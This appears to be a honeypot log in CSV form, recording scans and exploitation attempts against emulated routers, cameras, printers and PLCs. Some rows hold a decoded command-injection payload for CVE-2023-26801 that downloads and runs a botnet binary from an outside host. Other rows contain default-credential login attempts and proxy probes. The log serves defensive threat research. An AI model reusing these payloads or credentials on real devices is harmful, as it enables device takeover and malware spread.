local_ip,remote_ip,remote_port,local_port,tag_label,attack_time,target_profile,node_id,ASN,attack_data,method,path,User-Agent,Accept-Encoding,Accept,Qualys-Scan,Content-Length,Content-Type,Referrer,Host,body
172.16.16.69,67.205.179.8,41078,80,CID-982,2023-11-02T11:28:58,device:iot:Printer:Canon,429,AS14061,"{'method': 'GET', 'path': '//favicon.ico', 'headers': {'Host': '103.58.121.69, 103.58.121.69', 'Accept-Encoding': 'gzip, deflate, gzip, deflate', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36, Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36'}}",GET,//favicon.ico,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36, Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36","gzip, deflate, gzip, deflate",,,,,,"103.58.121.69, 103.58.121.69",
115.247.192.220,103.180.146.222,43476,80,CID-937,2023-11-02T12:16:57,device:iot:Router:Mi-Router,330,AS140803,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '115.247.192.220:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 115.247.192.220:80/menu.html', 'Authorization': 'Basic dXNlcjp1c2Vy'}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,115.247.192.220:80,
115.247.192.220,103.180.146.222,46820,80,CID-937,2023-11-02T12:16:57,device:iot:Router:Mi-Router,330,AS140803,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '115.247.192.220:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 115.247.192.220:80/menu.html', 'Authorization': 'Basic dXNlcjp1c2Vy'}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,115.247.192.220:80,
115.248.239.204,167.172.216.99,50048,80,CID-982,2023-11-02T12:26:41,device:scada:plc:Delta_Electronics,402,AS14061,"{'method': 'GET', 'path': '//cgi-bin/luci', 'headers': {'Host': '115.248.239.204, 115.248.239.204', 'Accept-Encoding': 'gzip, deflate, gzip, deflate', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36, Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36'}}",GET,//cgi-bin/luci,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36, Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36","gzip, deflate, gzip, deflate",,,,,,"115.248.239.204, 115.248.239.204",
172.24.6.75,103.180.146.222,38772,80,CID-937,2023-11-02T12:16:42,device:iot:IPCamera:MOBOTIXCamera,500,AS140803,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '103.38.191.245:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 103.38.191.245:80/menu.html', 'Authorization': 'Basic YWRtaW46YWRtaW4='}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,103.38.191.245:80,
172.16.16.69,173.230.158.125,57322,80,CID-1150,2023-11-02T11:26:23,device:iot:Printer:Canon,429,AS63949,"{'method': 'GET', 'path': '/sslvpnLogin.html', 'headers': {'Host': '103.58.121.69:80', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36', 'Accept-Encoding': 'gzip', 'Connection': 'close'}}",GET,/sslvpnLogin.html,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",gzip,,,,,,103.58.121.69:80,
121.241.40.21,45.128.232.183,60902,8080,CID-1193,2023-11-02T13:28:44,device:web:server:Apache,122,AS202685,"{'method': 'CONNECT', 'path': 'google.com:443', 'headers': {'Host': 'google.com:443', 'User-Agent': 'Go-http-client/1.1'}}",CONNECT,google.com:443,Go-http-client/1.1,,,,,,,google.com:443,
103.178.162.13,89.190.156.170,34118,8080,CVE-2023-26801,2023-11-02T12:28:38,device:web:server:Apache,343,AS49870,"{'method': 'POST', 'path': '/goform/set_LimitClient_cfg', 'headers': {'Host': '103.178.162.13:8080', 'User-Agent': 'Go-http-client/1.1', 'Content-Length': '201', 'Cookie': 'user=admin', 'Accept-Encoding': 'gzip'}, 'body': b'dGltZTE9MDA6MDAtMDA6MDAmdGltZTI9MDA6MDAtMDA6MDAmbWFjPTtraWxsYWxsIC05IC9iaW4vc2g7IGtpbGxhbGwgLTkgL3ovYmluOyBraWxsYWxsIC05IC9iaW4vYmFzaDsgcm0gLXJmICptcHNsKjsgd2dldCBodHRwOi8vYm9hdHMuZG9nbXVuY2hlci54eXovQXF1YS5tcHNsOyBjaG1vZCA3NzcgQXF1YS5tcHNsOyAuL0FxdWEubXBzbCBsYmxpbms7'}",POST,/goform/set_LimitClient_cfg,Go-http-client/1.1,gzip,,,201,,,103.178.162.13:8080,time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 /bin/sh; killall -9 /z/bin; killall -9 /bin/bash; rm -rf *mpsl*; wget http://boats.dogmuncher.xyz/Aqua.mpsl; chmod 777 Aqua.mpsl; ./Aqua.mpsl lblink;
172.27.29.12,45.127.222.119,33142,80,Hikvision_IP_camera_scan,2023-11-02T13:26:07,device:iot:IPCamera:Hikvision,239,AS45433,"{'method': 'GET', 'path': '/ISAPI/Security/userCheck', 'headers': {'Host': '103.191.170.242', 'User-Agent': 'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393', 'Accept-Encoding': 'gzip, deflate, br', 'Accept': '*/*', 'Connection': 'close', 'Authorization': 'Basic YWRtaW46YXNkZjEyMzQ='}}",GET,/ISAPI/Security/userCheck,Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393,"gzip, deflate, br",*/*,,,,,103.191.170.242,
172.27.29.12,45.127.222.119,33142,80,Hikvision_IP_camera_scan,2023-11-02T13:26:07,device:iot:IPCamera:Hikvision,239,AS45433,"{'method': 'GET', 'path': '/ISAPI/Security/userCheck', 'headers': {'Host': '103.191.170.242', 'User-Agent': 'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393', 'Accept-Encoding': 'gzip, deflate, br', 'Accept': '*/*', 'Connection': 'close', 'Authorization': 'Basic YWRtaW46YXNkZjEyMzQ='}}",GET,/ISAPI/Security/userCheck,Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393,"gzip, deflate, br",*/*,,,,,103.191.170.242,
103.127.141.232,103.180.146.222,57372,80,CVE-2020-8958,2023-11-02T13:38:21,device:iot:Printer:HPLaserJet,137,AS140803,"{'method': 'POST', 'path': '/boaform/admin/formLogin', 'headers': {'Host': '103.127.141.232:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '29', 'Origin': 'http://103.127.141.232:80', 'Connection': 'keep-alive', 'Referer': 'http://103.127.141.232:80/admin/login.asp', 'Upgrade-Insecure-Requests': '1'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcHNkPUZlZWZpZm9mdW0='}",POST,/boaform/admin/formLogin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,29,application/x-www-form-urlencoded,,103.127.141.232:80,username=admin&psd=Feefifofum
103.167.77.220,45.127.222.119,39018,80,Hikvision_IP_camera_scan,2023-11-02T13:24:44,device:iot:IPCamera:Hikvision,377,AS45433,"{'method': 'GET', 'path': '/ISAPI/Security/userCheck', 'headers': {'Host': '103.167.77.220', 'User-Agent': 'Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393', 'Accept-Encoding': 'gzip, deflate, br', 'Accept': '*/*', 'Connection': 'close', 'Authorization': 'Basic YWRtaW46YXNkZjEyMzQ='}}",GET,/ISAPI/Security/userCheck,Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393,"gzip, deflate, br",*/*,,,,,103.167.77.220,
103.118.160.224,89.190.156.170,58266,8080,CVE-2023-26801,2023-11-02T13:35:06,device:web:server:Apache,74,AS49870,"{'method': 'POST', 'path': '/goform/set_LimitClient_cfg', 'headers': {'Host': '103.118.160.224:8080', 'User-Agent': 'Go-http-client/1.1', 'Content-Length': '201', 'Cookie': 'user=admin', 'Accept-Encoding': 'gzip'}, 'body': b'dGltZTE9MDA6MDAtMDA6MDAmdGltZTI9MDA6MDAtMDA6MDAmbWFjPTtraWxsYWxsIC05IC9iaW4vc2g7IGtpbGxhbGwgLTkgL3ovYmluOyBraWxsYWxsIC05IC9iaW4vYmFzaDsgcm0gLXJmICptcHNsKjsgd2dldCBodHRwOi8vYm9hdHMuZG9nbXVuY2hlci54eXovQXF1YS5tcHNsOyBjaG1vZCA3NzcgQXF1YS5tcHNsOyAuL0FxdWEubXBzbCBsYmxpbms7'}",POST,/goform/set_LimitClient_cfg,Go-http-client/1.1,gzip,,,201,,,103.118.160.224:8080,time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 /bin/sh; killall -9 /z/bin; killall -9 /bin/bash; rm -rf *mpsl*; wget http://boats.dogmuncher.xyz/Aqua.mpsl; chmod 777 Aqua.mpsl; ./Aqua.mpsl lblink;
164.100.181.236,103.180.146.222,60918,80,CVE-2020-8958,2023-11-02T13:38:45,device:iot:Router:Cisco,73,AS140803,"{'method': 'POST', 'path': '/boaform/admin/formLogin', 'headers': {'Host': '164.100.181.236:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '29', 'Origin': 'http://164.100.181.236:80', 'Connection': 'keep-alive', 'Referer': 'http://164.100.181.236:80/admin/login.asp', 'Upgrade-Insecure-Requests': '1'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcHNkPUZlZWZpZm9mdW0='}",POST,/boaform/admin/formLogin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,29,application/x-www-form-urlencoded,,164.100.181.236:80,username=admin&psd=Feefifofum
117.239.112.232,103.180.146.222,49502,80,CID-937,2023-11-02T13:33:12,device:iot:Router:Cisco,261,AS140803,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '117.239.112.232:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 117.239.112.232:80/menu.html', 'Authorization': 'Basic YWRtaW46YWRtaW4='}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,117.239.112.232:80,
10.182.96.186,103.180.146.222,35524,80,CID-937,2023-11-02T13:35:49,device:iot:Router:Mi-Router,362,AS140803,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '164.100.126.161:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 164.100.126.161:80/menu.html', 'Authorization': 'Basic dm9kYWZvbmU6dm9kYWZvbmU='}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,164.100.126.161:80,
125.23.43.60,103.180.146.222,52424,80,CID-937,2023-11-02T13:33:53,device:iot:IPCamera:CISCO-WebCam,481,AS140803,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '125.23.43.60:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 125.23.43.60:80/menu.html', 'Authorization': 'Basic dXNlcjp1c2Vy'}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,125.23.43.60:80,
172.24.6.75,103.180.146.222,34262,80,CID-937,2023-11-02T13:37:07,device:iot:IPCamera:MOBOTIXCamera,500,AS140803,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '103.38.191.245:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 103.38.191.245:80/menu.html', 'Authorization': 'Basic YWRtaW46emhvbmU='}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,103.38.191.245:80,
103.30.64.118,103.180.146.222,57618,80,CID-937,2023-11-02T13:31:37,device:iot:Router:Cisco,414,AS140803,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '103.30.64.118:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 103.30.64.118:80/menu.html', 'Authorization': 'Basic dXNlcjp1c2Vy'}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,103.30.64.118:80,
103.30.64.118,103.180.146.222,57618,80,CID-937,2023-11-02T13:31:37,device:iot:Router:Cisco,414,AS140803,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '103.30.64.118:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 103.30.64.118:80/menu.html', 'Authorization': 'Basic dXNlcjp1c2Vy'}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,103.30.64.118:80,
220.158.180.52,103.180.146.222,38970,80,CID-937,2023-11-02T13:36:18,device:iot:IPCamera:MOBOTIXCamera,456,AS140803,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '220.158.180.52:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 220.158.180.52:80/menu.html', 'Authorization': 'Basic dm9kYWZvbmU6dm9kYWZvbmU='}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,220.158.180.52:80,
182.66.229.139,103.180.146.222,59626,80,CID-937,2023-11-02T13:33:50,device:iot:IPCamera:MOBOTIXCamera,538,AS140803,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '182.66.229.139:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 182.66.229.139:80/menu.html', 'Authorization': 'Basic dXNlcjp1c2Vy'}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,182.66.229.139:80,
192.168.220.152,103.180.146.222,60234,80,CID-937,2023-11-02T13:34:47,device:iot:Router:Cisco,392,AS140803,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '103.231.79.127:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 103.231.79.127:80/menu.html', 'Authorization': 'Basic dXNlcjp1c2Vy'}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,103.231.79.127:80,
192.168.220.152,103.180.146.222,57680,80,CID-937,2023-11-02T13:34:47,device:iot:Router:Cisco,392,AS140803,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '103.231.79.127:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 103.231.79.127:80/menu.html', 'Authorization': 'Basic dXNlcjp1c2Vy'}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,103.231.79.127:80,
172.16.16.59,103.180.146.222,46488,80,CID-937,2023-11-02T13:34:36,device:iot:IPCamera:CISCO-WebCam,428,AS140803,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '103.58.121.59:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 103.58.121.59:80/menu.html', 'Authorization': 'Basic YWRtaW46emhvbmU='}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,103.58.121.59:80,
172.16.16.59,103.180.146.222,46488,80,CID-937,2023-11-02T13:34:36,device:iot:IPCamera:CISCO-WebCam,428,AS140803,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '103.58.121.59:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 103.58.121.59:80/menu.html', 'Authorization': 'Basic dXNlcjp1c2Vy'}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,103.58.121.59:80,
59.145.139.183,62.133.60.92,40862,80,CVE-2020-8958,2023-11-03T12:45:53,device:iot:IPCamera:Hikvision,250,AS207713,"{'method': 'POST', 'path': '/boaform/admin/formLogin', 'headers': {'Host': '59.145.139.183:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '29', 'Origin': 'http://59.145.139.183:80', 'Connection': 'keep-alive', 'Referer': 'http://59.145.139.183:80/admin/login.asp', 'Upgrade-Insecure-Requests': '1'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcHNkPUZlZWZpZm9mdW0='}",POST,/boaform/admin/formLogin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,29,application/x-www-form-urlencoded,,59.145.139.183:80,username=admin&psd=Feefifofum
192.168.130.8,62.133.60.92,43528,80,CVE-2020-8958,2023-11-03T13:45:10,device:iot:IPCamera:Panasonic,448,AS207713,"{'method': 'POST', 'path': '/boaform/admin/formLogin', 'headers': {'Host': '112.133.242.125:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '29', 'Origin': 'http://112.133.242.125:80', 'Connection': 'keep-alive', 'Referer': 'http://112.133.242.125:80/admin/login.asp', 'Upgrade-Insecure-Requests': '1'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcHNkPUZlZWZpZm9mdW0='}",POST,/boaform/admin/formLogin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,29,application/x-www-form-urlencoded,,112.133.242.125:80,username=admin&psd=Feefifofum
192.168.220.152,193.35.18.187,59018,80,CID-1193,2023-11-03T13:44:40,device:iot:Router:Cisco,392,AS202685,"{'method': 'CONNECT', 'path': 'google.com:443', 'headers': {'Host': 'google.com:443', 'User-Agent': 'Go-http-client/1.1'}}",CONNECT,google.com:443,Go-http-client/1.1,,,,,,,google.com:443,
